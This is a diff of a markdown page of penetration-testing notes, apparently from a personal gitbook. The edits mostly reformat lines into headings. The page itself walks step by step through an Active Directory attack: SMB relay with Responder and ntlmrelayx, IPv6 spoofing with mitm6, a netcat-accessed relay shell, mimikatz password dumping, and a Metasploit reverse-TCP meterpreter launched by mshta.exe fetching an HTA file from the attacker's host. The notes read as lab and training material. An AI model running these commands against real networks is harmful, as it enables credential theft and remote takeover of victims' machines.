@@ -136,8 +136,6 @@ nano /usr/share/responder/Responder.conf
 
 ![](../../../.gitbook/assets/image%20%28221%29.png)
 
-![](../../../.gitbook/assets/image%20%28216%29.png)
-
 #### detect machines with smb signing disabled
 
 ```text
@@ -146,7 +144,7 @@ nano /usr/share/responder/Responder.conf
 
 ![](../../../.gitbook/assets/image%20%28219%29.png)
 
-turn off smb and http in responder settings
+#### turn off smb and http in responder settings
 
 ```text
 responder -I vboxnet0 -rdwv
@@ -156,7 +154,7 @@ apt install impacket-scripts
 python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support
 ```
 
-trigger the attack by opening the attacker ip in the user machine with smb relay turned off
+#### trigger the attack by opening the attacker ip in the user machine with smb relay turned off
 
 ![](../../../.gitbook/assets/image%20%28214%29.png)
 
@@ -168,7 +166,7 @@ trigger the attack by opening the attacker ip in the user machine with smb relay
 python mitm6.py -d megacorp.local -i vboxnet0
 ```
 
-we can add -i to get an smb shell if posible
+#### we can add -i to get an smb shell if posible
 
 ```text
 ntlmrelayx.py -6 -t smb://192.168.56.115 -wh fakewpad.megacorp.local -l lootme  -i
@@ -176,7 +174,7 @@ ntlmrelayx.py -6 -t smb://192.168.56.115 -wh fakewpad.megacorp.local -l lootme  
 
 ![](../../../.gitbook/assets/image%20%28217%29.png)
 
-we can connect to the shell with netcat:
+#### we can connect to the shell with netcat:
 
 ```text
 nc 127.0.0.1 11000
@@ -184,7 +182,7 @@ nc 127.0.0.1 11000
 
 ![](../../../.gitbook/assets/image%20%28222%29.png)
 
-now we are in the victims share directory
+#### now we are in the victims share directory
 
 ```text
 -e [payload.exe]  → to run a payload generated on attackers machine
@@ -202,11 +200,11 @@ if you get error while running the system commmands just edit the multirelay con
 
 ![](../../../.gitbook/assets/image%20%28215%29.png)
 
-after triggering the host we have this:
+#### after triggering the host we have this:
 
 ![](../../../.gitbook/assets/image%20%28227%29.png)
 
-we can run mimicatz commands with mimi \[cmd\]:
+#### we can run mimicatz commands with mimi \[cmd\]:
 
 ```text
 mimi sekurlsa::logonpasswords
@@ -216,7 +214,7 @@ mimi sekurlsa::Kerberos​
 
 ## Meterpreter Shell
 
-we can also use this cmd shell to pop a meterpreter shell:
+#### we can also use this cmd shell to pop a meterpreter shell:
 
 ```text
 use exploit/windows/misc/hta_server
@@ -225,15 +223,15 @@ set payload windows/x64/meterpreter/reverse_tcp
 
 ![](../../../.gitbook/assets/image%20%28226%29.png)
 
-now in the cmd shell from multirelay type in :
+#### now in the cmd shell from multirelay type in :
 
 ```text
 mshta.exe http://192.168.56.1:8080/BdssjDFeW7IDPKF.hta
 ```
 
-done!
+#### done!
 
-#### other ways to get a meterpreter shell:
+### other ways to get a meterpreter shell:
 
 {% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}
 
